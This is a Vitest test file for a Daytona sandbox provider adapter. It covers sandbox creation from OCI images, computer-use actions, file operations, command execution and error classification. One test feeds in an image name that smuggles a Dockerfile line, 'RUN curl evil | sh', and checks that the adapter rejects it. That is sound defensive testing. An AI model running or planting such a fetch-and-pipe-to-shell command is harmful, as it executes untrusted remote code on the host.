import { expect, it, vi } from "vitest";
import { ProviderError, type ProviderCreateSandboxInput } from "@openmetal/provider-core";
import { DaytonaSandboxProvider } from "../src/index.js";

const DIGEST_IMAGE =
  "docker.io/superagentai/repository-red-team@sha256:ca7c5f624d88bf51879fe55c85aaaf7e292ee9a27e25a5f682bcaa6a987df5e7";

function createInput(image?: string): ProviderCreateSandboxInput {
  return {
    metalSandboxId: "sbx_1",
    organizationId: "org",
    projectId: "prj",
    language: image ? "custom" : "typescript",
    image,
    ttlMinutes: 30,
    source: image
      ? { kind: "oci_image", image }
      : { kind: "environment", environment: "metal/node", version: "latest" },
    resources: { vcpu: 2, memoryMb: 4096, diskMb: 10_240, architecture: "x86_64" },
    lifecycle: {
      runtimeTimeoutSeconds: 1800,
      onRuntimeTimeout: "destroy",
      onIdleTimeout: "destroy",
    },
  };
}

it("declares the Daytona provider contract", () => {
  const provider = new DaytonaSandboxProvider({ apiKey: "test" });
  expect(provider.name).toBe("daytona");
  expect(provider.capabilities.pause).toBe(false);
  expect(provider.capabilities.runtime).toMatchObject({
    process: { exec: true, streams: false, cancel: true },
    files: {
      read: true,
      write: true,
      writeModes: ["create", "overwrite"],
      createParents: true,
      list: true,
      delete: true,
    },
    httpEndpoints: { expose: false, revoke: false },
    computer: {
      implementation: "native",
      screenshot: { formats: ["png", "jpeg"] },
      recording: { formats: ["mp4"] },
    },
  });
  expect(provider.exposeHttpEndpoint).toBeUndefined();
  expect(provider.revokeHttpEndpoint).toBeUndefined();
});

it("boots the default Daytona snapshot when no image is requested", async () => {
  const fetchImpl = vi.fn<typeof fetch>(async (_input, init) => {
    expect(JSON.parse(String(init?.body))).toEqual({
      name: "metal-sbx_1",
      ephemeral: true,
      autoDeleteInterval: 0,
      autoStopInterval: 0,
      ttlMinutes: 60,
      labels: {
        "metal.sandbox_id": "sbx_1",
        "metal.organization_id": "org",
        "metal.project_id": "prj",
      },
    });
    return Response.json({
      id: "sandbox-1",
      organizationId: "org-1",
      state: "started",
      toolboxProxyUrl: "https://proxy.daytona.test/toolbox",
    });
  });
  const provider = new DaytonaSandboxProvider({ apiKey: "test", fetchImpl });

  await expect(provider.create(createInput())).resolves.toMatchObject({
    providerResourceId: "sandbox-1",
    providerOrganizationId: "org-1",
  });
  expect(fetchImpl).toHaveBeenCalledTimes(1);
});

it("builds a Daytona sandbox from the requested OCI image and waits until it starts", async () => {
  vi.useFakeTimers();
  let polls = 0;
  const fetchImpl = vi.fn<typeof fetch>(async (input, init) => {
    const url = String(input);
    if (init?.method === "POST") {
      expect(JSON.parse(String(init.body))).toEqual({
        name: "metal-sbx_1",
        ephemeral: true,
        autoDeleteInterval: 0,
        autoStopInterval: 0,
        ttlMinutes: 46,
        buildInfo: { dockerfileContent: `FROM ${DIGEST_IMAGE}\n` },
        cpu: 2,
        memory: 4,
        disk: 10,
        labels: {
          "metal.sandbox_id": "sbx_1",
          "metal.organization_id": "org",
          "metal.project_id": "prj",
        },
      });
      return Response.json({
        id: "sandbox-1",
        organizationId: "org-1",
        state: "building_snapshot",
      });
    }
    if (url.endsWith("/sandbox/sandbox-1")) {
      polls += 1;
      return Response.json({
        id: "sandbox-1",
        organizationId: "org-1",
        state: polls < 2 ? "pulling_snapshot" : "started",
        toolboxProxyUrl: "https://proxy.daytona.test/toolbox/{sandboxId}",
      });
    }
    throw new Error(`Unexpected URL: ${url}`);
  });
  const provider = new DaytonaSandboxProvider({
    apiKey: "test",
    fetchImpl,
    imageReadyTimeoutMs: 60_000,
  });

  const created = provider.create(createInput(DIGEST_IMAGE));
  await vi.advanceTimersByTimeAsync(4_000);
  await expect(created).resolves.toMatchObject({
    providerResourceId: "sandbox-1",
    providerOrganizationId: "org-1",
    resolvedResources: { vcpu: 2, memoryMb: 4096, diskMb: 10_240 },
  });
  expect(polls).toBe(2);
  vi.useRealTimers();
});

it("allocates 16 GiB when an OCI image request omits disk", async () => {
  const fetchImpl = vi.fn<typeof fetch>(async (_input, init) => {
    expect(JSON.parse(String(init?.body))).toMatchObject({
      buildInfo: { dockerfileContent: "FROM node:22-bookworm\n" },
      cpu: 2,
      memory: 4,
      disk: 16,
    });
    return Response.json({
      id: "sandbox-1",
      organizationId: "org-1",
      state: "started",
    });
  });
  const provider = new DaytonaSandboxProvider({ apiKey: "test", fetchImpl });
  const input = createInput("node:22-bookworm");
  delete input.resources.diskMb;

  await expect(provider.create(input)).resolves.toMatchObject({
    resolvedResources: { memoryMb: 4096, diskMb: 16_384 },
  });
});

it("rejects an OCI image reference that is not safe to place in a Dockerfile", async () => {
  const fetchImpl = vi.fn<typeof fetch>();
  const provider = new DaytonaSandboxProvider({ apiKey: "test", fetchImpl });

  await expect(provider.create(createInput("node:22\nRUN curl evil | sh"))).rejects.toMatchObject({
    kind: "invalid_request",
  });
  expect(fetchImpl).not.toHaveBeenCalled();
});

it("reports a failed Daytona image build instead of a ready sandbox", async () => {
  const fetchImpl = vi.fn<typeof fetch>().mockResolvedValue(
    Response.json({
      id: "sandbox-1",
      organizationId: "org-1",
      state: "build_failed",
      errorReason: "manifest unknown",
    }),
  );
  const provider = new DaytonaSandboxProvider({ apiKey: "test", fetchImpl });

  await expect(provider.create(createInput("node:22-bookworm"))).rejects.toMatchObject({
    kind: "customer",
    message: "Daytona image build failed: manifest unknown",
  });
  expect(fetchImpl).toHaveBeenCalledWith(
    "https://app.daytona.io/api/sandbox/sandbox-1",
    expect.objectContaining({ method: "DELETE" }),
  );
});

it("waits for an existing named sandbox after a create conflict", async () => {
  vi.useFakeTimers();
  const fetchImpl = vi.fn<typeof fetch>(async (input, init) => {
    const url = String(input);
    if (init?.method === "POST") return new Response(null, { status: 409 });
    if (url.endsWith("/sandbox/metal-sbx_1")) {
      return Response.json({
        id: "sandbox-1",
        organizationId: "org-1",
        state: "pending_build",
      });
    }
    if (url.endsWith("/sandbox/sandbox-1")) {
      return Response.json({
        id: "sandbox-1",
        organizationId: "org-1",
        state: "started",
      });
    }
    throw new Error(`Unexpected URL: ${url}`);
  });
  const provider = new DaytonaSandboxProvider({
    apiKey: "test",
    fetchImpl,
    imageReadyTimeoutMs: 60_000,
  });

  const created = provider.create(createInput("ghcr.io/superagentai/repository-red-team:0.9.1"));
  await vi.advanceTimersByTimeAsync(2_000);
  await expect(created).resolves.toMatchObject({ providerResourceId: "sandbox-1" });
  vi.useRealTimers();
});

it("uses Daytona native computer actions, screenshots, and recordings", async () => {
  const fetchImpl = vi.fn<typeof fetch>(async (input, init) => {
    const url = String(input);
    if (url.endsWith("/sandbox/sandbox-1")) {
      return Response.json({
        id: "sandbox-1",
        organizationId: "org-1",
        toolboxProxyUrl: "https://proxy.daytona.test/toolbox",
      });
    }
    if (url.endsWith("/computeruse/start")) return Response.json({ status: {} });
    if (url.endsWith("/computeruse/mouse/click")) {
      expect(JSON.parse(String(init?.body))).toMatchObject({
        x: 10,
        y: 20,
        button: "left",
      });
      return Response.json({ x: 10, y: 20 });
    }
    if (url.includes("/computeruse/screenshot?")) {
      return Response.json({
        screenshot: Buffer.from("png-bytes").toString("base64"),
        cursorPosition: { x: 1, y: 2 },
      });
    }
    if (url.endsWith("/computeruse/recordings/start")) {
      expect(JSON.parse(String(init?.body))).toEqual({ label: "rec_test" });
      return Response.json({
        id: "recording-1",
        status: "recording",
        fileName: "recording-1.mp4",
        filePath: "/workspace/recording-1.mp4",
        startTime: "2026-09-22T12:00:00.000Z",
      });
    }
    if (url.endsWith("/computeruse/recordings/stop")) {
      expect(JSON.parse(String(init?.body))).toEqual({ id: "recording-1" });
      return Response.json({
        id: "recording-1",
        status: "stopped",
        fileName: "recording-1.mp4",
        filePath: "/workspace/recording-1.mp4",
        startTime: "2026-09-22T12:00:00.000Z",
        endTime: "2026-09-22T12:00:01.000Z",
        durationSeconds: 1,
        sizeBytes: 1024,
      });
    }
    if (url.endsWith("/computeruse/recordings/recording-1")) {
      return Response.json({
        id: "recording-1",
        status: "stopped",
        fileName: "recording-1.mp4",
        filePath: "/workspace/recording-1.mp4",
        startTime: "2026-09-22T12:00:00.000Z",
        endTime: "2026-09-22T12:00:01.000Z",
      });
    }
    throw new Error(`Unexpected URL: ${url}`);
  });
  const provider = new DaytonaSandboxProvider({ apiKey: "test", fetchImpl });

  await provider.executeComputerAction({
    providerResourceId: "sandbox-1",
    action: { type: "mouse_click", x: 10, y: 20, button: "left" },
  });
  await expect(
    provider.captureComputerScreenshot({
      providerResourceId: "sandbox-1",
      format: "png",
    }),
  ).resolves.toMatchObject({
    format: "png",
    data: new Uint8Array(Buffer.from("png-bytes")),
    cursorPosition: { x: 1, y: 2 },
  });
  const recording = await provider.startComputerRecording({
    providerResourceId: "sandbox-1",
    recordingKey: "rec_test",
    format: "mp4",
    label: "demo",
  });
  expect(recording).toMatchObject({
    recordingId: "recording-1",
    state: "recording",
    filePath: "/workspace/recording-1.mp4",
  });
  await expect(
    provider.stopComputerRecording({
      providerResourceId: "sandbox-1",
      recordingId: recording.recordingId,
    }),
  ).resolves.toMatchObject({
    state: "stopped",
    sizeBytes: 1024,
    durationSeconds: 1,
  });
  await expect(
    provider.reconcileComputerRecording({
      providerResourceId: "sandbox-1",
      recordingKey: "rec_test",
      recordingId: "recording-1",
    }),
  ).resolves.toMatchObject({
    recordingId: "recording-1",
    state: "stopped",
  });
});

it("treats repeated destroy conflicts as idempotent success", async () => {
  const fetchImpl = vi
    .fn<typeof fetch>()
    .mockResolvedValueOnce(new Response(null, { status: 204 }))
    .mockResolvedValueOnce(new Response(null, { status: 409 }));
  const provider = new DaytonaSandboxProvider({ apiKey: "test", fetchImpl });

  await expect(provider.destroy("sandbox-1")).resolves.toBeUndefined();
  await expect(provider.destroy("sandbox-1")).resolves.toBeUndefined();
  expect(fetchImpl).toHaveBeenCalledTimes(2);
});

it("reconciles a missing Daytona sandbox as absent", async () => {
  const provider = new DaytonaSandboxProvider({
    apiKey: "test",
    fetchImpl: vi.fn().mockResolvedValue(new Response(null, { status: 404 })),
  });

  await expect(provider.reconcileCreate("sbx_missing")).resolves.toBeNull();
});

it("treats an unavailable computer-use service as an absent sandbox capability", async () => {
  vi.useFakeTimers();
  const fetchImpl = vi.fn<typeof fetch>(async (input) => {
    const url = String(input);
    if (url.endsWith("/sandbox/sandbox-1")) {
      return Response.json({
        id: "sandbox-1",
        organizationId: "org-1",
        toolboxProxyUrl: "https://proxy.daytona.test/toolbox",
      });
    }
    if (url.endsWith("/computeruse/status")) return new Response(null, { status: 503 });
    throw new Error(`Unexpected URL: ${url}`);
  });
  const provider = new DaytonaSandboxProvider({ apiKey: "test", fetchImpl });
  const discovery = provider.discoverRuntimeCapabilities("sandbox-1");
  await vi.advanceTimersByTimeAsync(4_000);
  const capabilities = await discovery;
  expect(capabilities).toMatchObject({
    process: { exec: true },
    files: { read: true },
  });
  expect(capabilities.computer).toBeUndefined();
  expect(fetchImpl).toHaveBeenCalledTimes(6);
  vi.useRealTimers();
});

it("does not advertise recording when FFmpeg is unavailable", async () => {
  const fetchImpl = vi.fn<typeof fetch>(async (input, init) => {
    const url = String(input);
    if (url.endsWith("/sandbox/sandbox-1")) {
      return Response.json({
        id: "sandbox-1",
        organizationId: "org-1",
        toolboxProxyUrl: "https://proxy.daytona.test/toolbox",
      });
    }
    if (url.endsWith("/computeruse/status")) return Response.json({ status: "running" });
    if (url.endsWith("/process/session")) return Response.json({});
    if (url.includes("/process/session/") && url.endsWith("/exec")) {
      expect(JSON.parse(String(init?.body))).toMatchObject({
        command: expect.stringContaining("command -v ffmpeg"),
        runAsync: true,
      });
      return Response.json({ cmdId: "ffmpeg-probe" });
    }
    if (url.endsWith("/command/ffmpeg-probe/logs")) {
      return Response.json({ stdout: "", stderr: "" });
    }
    if (url.endsWith("/command/ffmpeg-probe")) {
      return Response.json({
        id: "ffmpeg-probe",
        command: "command -v ffmpeg",
        exitCode: 127,
      });
    }
    if (url.includes("/process/session/") && init?.method === "DELETE") {
      return Response.json({});
    }
    throw new Error(`Unexpected URL: ${url}`);
  });
  const provider = new DaytonaSandboxProvider({ apiKey: "test", fetchImpl });
  const capabilities = await provider.discoverRuntimeCapabilities("sandbox-1");

  expect(capabilities.computer?.screenshot).toBeDefined();
  expect(capabilities.computer?.recording).toBeUndefined();
});

it("keeps desktop capabilities when the recording probe is unavailable", async () => {
  const fetchImpl = vi.fn<typeof fetch>(async (input) => {
    const url = String(input);
    if (url.endsWith("/sandbox/sandbox-1")) {
      return Response.json({
        id: "sandbox-1",
        organizationId: "org-1",
        toolboxProxyUrl: "https://proxy.daytona.test/toolbox",
      });
    }
    if (url.endsWith("/computeruse/status")) return Response.json({ status: "running" });
    if (url.endsWith("/process/session")) return new Response(null, { status: 503 });
    throw new Error(`Unexpected URL: ${url}`);
  });
  const provider = new DaytonaSandboxProvider({ apiKey: "test", fetchImpl });
  const capabilities = await provider.discoverRuntimeCapabilities("sandbox-1");

  expect(capabilities.computer?.screenshot).toBeDefined();
  expect(capabilities.computer?.actions.length).toBeGreaterThan(0);
  expect(capabilities.computer?.recording).toBeUndefined();
});

it("marks Daytona analytics prices as provider reported", async () => {
  const row = {
    sandboxId: "sandbox-1",
    totalPrice: 0.75,
    lastEnd: "2026-08-27T11:00:00.000Z",
  };
  const provider = new DaytonaSandboxProvider({
    apiKey: "test",
    organizationId: "org-1",
    fetchImpl: vi.fn().mockResolvedValue(Response.json([row])),
  });

  const cost = await provider.getCost({
    providerResourceId: "sandbox-1",
    from: new Date("2026-08-27T10:00:00.000Z"),
    to: new Date("2026-08-27T11:00:00.000Z"),
  });

  expect(cost).toMatchObject({
    amountMicrousd: 750_000n,
    provenance: "provider_reported",
    confidence: "high",
    source: "daytona-analytics-sandbox-usage",
    raw: row,
  });
});

it("decodes Daytona 0.163 plain-text logs after asynchronous execution", async () => {
  let commandPolls = 0;
  const fetchImpl = vi.fn<typeof fetch>(async (input, init) => {
    const url = String(input);
    if (url.endsWith("/sandbox/sandbox-1")) {
      return Response.json({
        id: "sandbox-1",
        organizationId: "org-1",
        toolboxProxyUrl: "https://proxy.daytona.test/toolbox",
      });
    }
    if (url.endsWith("/toolbox/sandbox-1/process/session")) {
      if (init?.method === "POST") {
        expect(JSON.parse(String(init.body))).toMatchObject({ sessionId: expect.any(String) });
      }
      return new Response(null, { status: init?.method === "DELETE" ? 204 : 200 });
    }
    if (url.includes("/toolbox/sandbox-1/process/session/") && url.endsWith("/exec")) {
      expect(new Headers(init?.headers).get("x-daytona-sdk-version")).toBe("0.163.0");
      expect(new Headers(init?.headers).get("x-daytona-split-output")).toBe("true");
      expect(JSON.parse(String(init?.body))).toMatchObject({
        command: "cd -- '/workspace' && 'printf' '%s' 'hello world'",
        runAsync: true,
      });
      return Response.json({ cmdId: "command-1" });
    }
    if (url.endsWith("/command/command-1/logs")) {
      return new Response("\x01\x01\x01hello world\x02\x02\x02warning", {
        headers: { "content-type": "text/plain; charset=utf-8" },
      });
    }
    if (url.endsWith("/command/command-1")) {
      commandPolls += 1;
      return Response.json({
        id: "command-1",
        command: "printf",
        ...(commandPolls > 1 ? { exitCode: 0 } : {}),
      });
    }
    if (url.includes("/toolbox/sandbox-1/process/session/") && init?.method === "DELETE") {
      return new Response(null, { status: 204 });
    }
    throw new Error(`Unexpected URL: ${url}`);
  });
  const provider = new DaytonaSandboxProvider({
    apiKey: "test",
    fetchImpl,
    requestTimeoutMs: 5,
    processPollIntervalMs: 20,
  });

  const result = await provider.exec({
    providerResourceId: "sandbox-1",
    command: ["printf", "%s", "hello world"],
    cwd: "/workspace",
  });
  const events = [];
  for await (const event of result.events) events.push(event);
  expect(result.executionId).toMatch(/^daytona:/);
  expect(commandPolls).toBe(2);
  expect(events.map((event) => event.type)).toEqual(["stdout", "stderr", "exit"]);
  expect(events.map((event) => event.sequence)).toEqual([0, 1, 2]);
  expect(events.at(-1)).toMatchObject({ exitCode: 0, outputTruncated: false });
  expect(
    fetchImpl.mock.calls.some(([url, init]) => {
      return String(url).includes("/process/session/") && init?.method === "DELETE";
    }),
  ).toBe(true);
});

it("cancels a Daytona execution after an adapter restart", async () => {
  const fetchImpl = vi.fn<typeof fetch>(async (input, init) => {
    const url = String(input);
    if (url.endsWith("/sandbox/sandbox-1")) {
      return Response.json({
        id: "sandbox-1",
        organizationId: "org-1",
        toolboxProxyUrl: "https://proxy.daytona.test/toolbox",
      });
    }
    if (url.endsWith("/toolbox/sandbox-1/process/session") && init?.method === "POST") {
      return new Response(null, { status: 200 });
    }
    if (url.endsWith("/exec") && init?.method === "POST") {
      return Response.json({ cmdId: "command-1" });
    }
    if (url.includes("/process/session/") && init?.method === "DELETE") {
      return new Response(null, { status: 204 });
    }
    throw new Error(`Unexpected URL: ${url}`);
  });
  const provider = new DaytonaSandboxProvider({ apiKey: "test", fetchImpl });
  const execution = await provider.exec({
    providerResourceId: "sandbox-1",
    command: ["sleep", "30"],
  });
  const restarted = new DaytonaSandboxProvider({ apiKey: "test", fetchImpl });

  await expect(
    restarted.cancelExec({
      providerResourceId: "sandbox-1",
      executionId: execution.executionId,
    }),
  ).resolves.toEqual({ executionId: execution.executionId, cancelled: true });
  expect(
    fetchImpl.mock.calls.some(([url, init]) => {
      return String(url).includes("/process/session/") && init?.method === "DELETE";
    }),
  ).toBe(true);
});

it("refuses an unbounded Daytona download larger than the adapter limit", async () => {
  const fetchImpl = vi.fn<typeof fetch>(async (input) => {
    const url = String(input);
    if (url.endsWith("/sandbox/sandbox-1")) {
      return Response.json({
        id: "sandbox-1",
        organizationId: "org-1",
        toolboxProxyUrl: "https://proxy.daytona.test/toolbox",
      });
    }
    if (url.includes("/files/info?")) {
      return Response.json({
        name: "large.bin",
        size: 10 * 1_024 * 1_024 + 1,
        isDir: false,
      });
    }
    if (url.includes("/files/download?")) return new Response("ignored");
    throw new Error(`Unexpected URL: ${url}`);
  });
  const provider = new DaytonaSandboxProvider({ apiKey: "test", fetchImpl });
  await expect(
    provider.readFile({ providerResourceId: "sandbox-1", path: "/tmp/large.bin" }),
  ).rejects.toMatchObject({ kind: "unsupported" });
});

it("reads Daytona files with offsets through native toolbox routes", async () => {
  const fetchImpl = vi.fn<typeof fetch>(async (input) => {
    const url = String(input);
    if (url.endsWith("/sandbox/sandbox-1")) {
      return Response.json({
        id: "sandbox-1",
        organizationId: "org-1",
        toolboxProxyUrl: "https://proxy.daytona.test/toolbox",
      });
    }
    if (url.includes("/files/info?")) {
      return Response.json({
        name: "a.txt",
        size: 6,
        isDir: false,
        modTime: "2026-08-27T10:00:00Z",
      });
    }
    if (url.includes("/files/download?")) return new Response("abcdef");
    throw new Error(`Unexpected URL: ${url}`);
  });
  const provider = new DaytonaSandboxProvider({ apiKey: "test", fetchImpl });

  await expect(
    provider.readFile({
      providerResourceId: "sandbox-1",
      path: "/tmp/a.txt",
      offsetBytes: 1,
      maxBytes: 2,
      encoding: "utf8",
    }),
  ).resolves.toMatchObject({ data: "bc", byteLength: 2, sizeBytes: 6, truncated: true });
});

it("uploads Daytona files as multipart data", async () => {
  const fetchImpl = vi.fn<typeof fetch>(async (input, init) => {
    const url = String(input);
    if (url.endsWith("/sandbox/sandbox-1")) {
      return Response.json({
        id: "sandbox-1",
        organizationId: "org-1",
        toolboxProxyUrl: "https://proxy.daytona.test/toolbox",
      });
    }
    if (url.includes("/files/info?")) return new Response(null, { status: 404 });
    if (url.includes("/files/folder?")) {
      expect(url).toContain("path=workspace");
      expect(url).toContain("mode=755");
      return new Response(null, { status: 201 });
    }
    if (url.includes("/files/upload?")) {
      expect(init?.body).toBeInstanceOf(FormData);
      expect(await ((init?.body as FormData).get("file") as Blob).text()).toBe("hello");
      expect(new Headers(init?.headers).has("content-type")).toBe(false);
      return Response.json({});
    }
    throw new Error(`Unexpected URL: ${url}`);
  });
  const provider = new DaytonaSandboxProvider({ apiKey: "test", fetchImpl });

  await expect(
    provider.writeFile({
      providerResourceId: "sandbox-1",
      path: "/workspace/hello.txt",
      data: "hello",
      createParents: true,
    }),
  ).resolves.toEqual({ path: "/workspace/hello.txt", bytesWritten: 5, created: true });
});

function daytonaError(status: number, body: Record<string, unknown>): Response {
  return Response.json(
    { statusCode: status, timestamp: "2026-09-23T14:36:13.311Z", ...body },
    {
      status,
    },
  );
}

function toolboxSandbox(): Response {
  return Response.json({
    id: "sandbox-1",
    organizationId: "org-1",
    toolboxProxyUrl: "https://proxy.daytona.test/toolbox",
  });
}

it("surfaces the Daytona failure when the sandbox is no longer running", async () => {
  const fetchImpl = vi.fn<typeof fetch>(async (input) => {
    const url = String(input);
    if (url.endsWith("/sandbox/sandbox-1")) return toolboxSandbox();
    if (url.includes("/files/info?")) {
      return daytonaError(400, {
        message:
          "bad request: failed to resolve container IP after 3 attempts: no IP address found. Is the Sandbox started?",
        code: "SANDBOX_NOT_RUNNING",
        path: "/sandboxes/sandbox-1/toolbox/files/info",
      });
    }
    throw new Error(`Unexpected URL: ${url}`);
  });
  const provider = new DaytonaSandboxProvider({ apiKey: "test", fetchImpl });

  const failure = provider.readFile({ providerResourceId: "sandbox-1", path: "/tmp/a.txt" });
  await expect(failure).rejects.toBeInstanceOf(ProviderError);
  await expect(failure).rejects.toMatchObject({
    kind: "unavailable",
    retryable: false,
    message:
      "Daytona toolbox request failed (400 SANDBOX_NOT_RUNNING): bad request: failed to resolve container IP after 3 attempts: no IP address found. Is the Sandbox started?",
  });
});

it("does not report a missing file when the Daytona sandbox was deleted", async () => {
  let sandboxDeleted = false;
  const fetchImpl = vi.fn<typeof fetch>(async (input, init) => {
    const url = String(input);
    if (url.endsWith("/sandbox/sandbox-1")) return toolboxSandbox();
    if (url.includes("/files/info?")) {
      return sandboxDeleted
        ? daytonaError(404, {
            message:
              "not found: sandbox sandbox-1 not found, it may have been deleted or stopped - inspect audit logs for more info",
            code: "SANDBOX_NOT_FOUND",
          })
        : daytonaError(404, {
            message: "stat /workspace/missing.txt: no such file or directory",
            source: "DAYTONA_DAEMON",
            code: "FILE_NOT_FOUND",
          });
    }
    throw new Error(`Unexpected URL: ${url} ${init?.method}`);
  });
  const provider = new DaytonaSandboxProvider({ apiKey: "test", fetchImpl });
  const input = { providerResourceId: "sandbox-1", path: "/workspace/missing.txt" };

  await expect(provider.deleteFile(input)).resolves.toEqual({
    path: "/workspace/missing.txt",
    deleted: false,
  });
  sandboxDeleted = true;
  await expect(provider.deleteFile(input)).rejects.toMatchObject({
    kind: "unavailable",
    message: expect.stringContaining("(404 SANDBOX_NOT_FOUND): not found: sandbox sandbox-1"),
  });
});

it("fails a running Daytona command with the provider error when the sandbox disappears", async () => {
  const fetchImpl = vi.fn<typeof fetch>(async (input, init) => {
    const url = String(input);
    if (url.endsWith("/sandbox/sandbox-1")) return toolboxSandbox();
    if (url.endsWith("/toolbox/sandbox-1/process/session") && init?.method === "POST") {
      return new Response(null, { status: 200 });
    }
    if (url.endsWith("/exec")) return Response.json({ cmdId: "command-1" });
    if (url.endsWith("/command/command-1")) {
      return daytonaError(404, {
        message: "not found: sandbox sandbox-1 not found, it may have been deleted or stopped",
        code: "SANDBOX_NOT_FOUND",
      });
    }
    if (url.includes("/process/session/") && init?.method === "DELETE") {
      return daytonaError(404, { message: "sandbox not found", code: "SANDBOX_NOT_FOUND" });
    }
    throw new Error(`Unexpected URL: ${url}`);
  });
  const provider = new DaytonaSandboxProvider({ apiKey: "test", fetchImpl });
  const execution = await provider.exec({
    providerResourceId: "sandbox-1",
    command: ["./scanner", "--detach"],
  });

  const drain = async () => {
    for await (const _event of execution.events) {
      // The command never reports an exit code before the sandbox is removed.
    }
  };
  await expect(drain()).rejects.toMatchObject({
    kind: "unavailable",
    message: expect.stringContaining("SANDBOX_NOT_FOUND"),
  });
});

it("maps a sandbox lookup miss after an adapter restart to an unavailable sandbox", async () => {
  const fetchImpl = vi.fn<typeof fetch>(async (input) => {
    const url = String(input);
    if (url.endsWith("/sandbox/sandbox-1")) {
      return daytonaError(404, {
        error: "Not Found",
        message: "Sandbox with ID or name sandbox-1 not found",
      });
    }
    throw new Error(`Unexpected URL: ${url}`);
  });
  const provider = new DaytonaSandboxProvider({ apiKey: "test", fetchImpl });

  await expect(
    provider.listFiles({ providerResourceId: "sandbox-1", path: "/workspace" }),
  ).rejects.toMatchObject({
    kind: "unavailable",
    message:
      "Daytona API request failed (404 SANDBOX_NOT_FOUND): Sandbox with ID or name sandbox-1 not found",
  });
});

it("bounds untrusted Daytona error details", async () => {
  const fetchImpl = vi.fn<typeof fetch>(async (input) => {
    const url = String(input);
    if (url.endsWith("/sandbox/sandbox-1")) return toolboxSandbox();
    if (url.includes("/files/info?")) {
      return daytonaError(500, {
        message: `line one\n\u0000line two ${"x".repeat(1_000)}`,
        code: "lowercase code is not a Daytona code",
      });
    }
    if (url.includes("/files?")) {
      return new Response("<html>bad gateway</html>", { status: 502 });
    }
    throw new Error(`Unexpected URL: ${url}`);
  });
  const provider = new DaytonaSandboxProvider({ apiKey: "test", fetchImpl });

  const bounded = await provider
    .readFile({ providerResourceId: "sandbox-1", path: "/tmp/a.txt" })
    .catch((error: unknown) => error as ProviderError);
  expect(bounded).toMatchObject({ kind: "unavailable", retryable: true });
  expect(
    bounded.message.startsWith("Daytona toolbox request failed (500): line one line two x"),
  ).toBe(true);
  expect(bounded.message.length).toBeLessThan(400);
  expect([...bounded.message].some((character) => character.charCodeAt(0) < 0x20)).toBe(false);

  await expect(
    provider.listFiles({ providerResourceId: "sandbox-1", path: "/workspace" }),
  ).rejects.toMatchObject({
    kind: "unavailable",
    retryable: true,
    message: "Daytona toolbox request failed (502)",
  });
});

it("inspects provider-side Daytona sandbox state", async () => {
  const states = new Map<string, Response>([
    ["started", Response.json({ id: "started", organizationId: "org-1", state: "started" })],
    ["stopped", Response.json({ id: "stopped", organizationId: "org-1", state: "stopped" })],
    [
      "destroying",
      Response.json({ id: "destroying", organizationId: "org-1", state: "destroying" }),
    ],
    [
      "error",
      Response.json({
        id: "error",
        organizationId: "org-1",
        state: "error",
        errorReason: "runner\nunreachable",
      }),
    ],
    ["missing", daytonaError(404, { error: "Not Found", message: "Sandbox not found" })],
  ]);
  const provider = new DaytonaSandboxProvider({
    apiKey: "test",
    fetchImpl: vi.fn<typeof fetch>(async (input) => {
      const id = String(input).split("/").at(-1)!;
      const response = states.get(id);
      if (!response) throw new Error(`Unexpected URL: ${String(input)}`);
      return response;
    }),
  });

  await expect(provider.inspect("started")).resolves.toEqual({
    state: "running",
    providerState: "started",
    reason: null,
  });
  await expect(provider.inspect("stopped")).resolves.toMatchObject({ state: "stopped" });
  await expect(provider.inspect("destroying")).resolves.toMatchObject({ state: "absent" });
  await expect(provider.inspect("error")).resolves.toEqual({
    state: "failed",
    providerState: "error",
    reason: "runner unreachable",
  });
  await expect(provider.inspect("missing")).resolves.toEqual({
    state: "absent",
    providerState: null,
    reason: null,
  });
});

it("keeps Daytona API failures classified for provider fallback", async () => {
  const provider = (status: number) =>
    new DaytonaSandboxProvider({
      apiKey: "test",
      fetchImpl: vi
        .fn<typeof fetch>()
        .mockResolvedValue(daytonaError(status, { message: "request rejected" })),
    });

  await expect(provider(401).create(createInput())).rejects.toMatchObject({
    kind: "auth",
    retryable: false,
  });
  await expect(provider(429).create(createInput())).rejects.toMatchObject({
    kind: "capacity",
    retryable: true,
  });
  await expect(provider(503).create(createInput())).rejects.toMatchObject({
    kind: "unavailable",
    retryable: true,
  });
  await expect(provider(400).create(createInput())).rejects.toMatchObject({
    kind: "invalid_request",
    retryable: false,
    message: "Daytona API request failed (400): request rejected",
  });
});
